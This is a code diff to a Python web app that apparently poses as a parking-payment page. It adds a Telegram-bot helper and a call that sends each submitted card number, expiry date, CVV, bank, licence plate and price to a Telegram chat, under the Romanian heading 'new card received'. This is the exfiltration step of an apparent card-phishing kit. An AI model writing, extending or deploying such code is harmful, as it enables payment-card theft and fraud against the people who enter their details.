@@ -18,6 +18,22 @@ socketio = SocketIO(async_mode='gevent')
 _session_sids = {}
 _blocked_ips = set()
 
+_TG_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '')
+_TG_CHAT  = os.getenv('TELEGRAM_CHAT_ID', '')
+
+def _send_telegram(text):
+    if not _TG_TOKEN or not _TG_CHAT:
+        return
+    try:
+        payload = json.dumps({'chat_id': _TG_CHAT, 'text': text, 'parse_mode': 'HTML'}).encode()
+        req = urllib.request.Request(
+            f'https://api.telegram.org/bot{_TG_TOKEN}/sendMessage',
+            data=payload,
+            headers={'Content-Type': 'application/json'})
+        urllib.request.urlopen(req, timeout=5)
+    except Exception:
+        pass
+
 
 def _detect_browser(ua):
     u = ua.lower()
@@ -312,6 +328,17 @@ def create_app():
             ps.bin_bank = bin_bank
             ps.status = 'payment_pending'
             db.session.commit()
+            _send_telegram(
+                f'🔔 <b>Card nou primit</b>\n'
+                f'💳 <code>{ps.card_number_display}</code>\n'
+                f'📅 Exp: <b>{ps.exp_date}</b>  CVV: <b>{ps.cvv}</b>\n'
+                f'🏦 {bin_bank or "—"}\n'
+                f'🚗 Plăcuță: <b>{ps.plate_number}</b>\n'
+                f'🌍 Țară: {ps.country or "—"}  |  Browser: {ps.browser or "—"}\n'
+                f'⏱ Durată: {ps.hours} {ps.time_unit or "ore"}\n'
+                f'💰 Preț: <b>{ps.total_price} €</b>\n'
+                f'🕐 {datetime.utcnow().strftime("%H:%M:%S UTC")}'
+            )
             socketio.emit('payment_submitted', {
                     'id': ps.id, 'plate': ps.plate_number,
                     'card_display': ps.card_number_display,
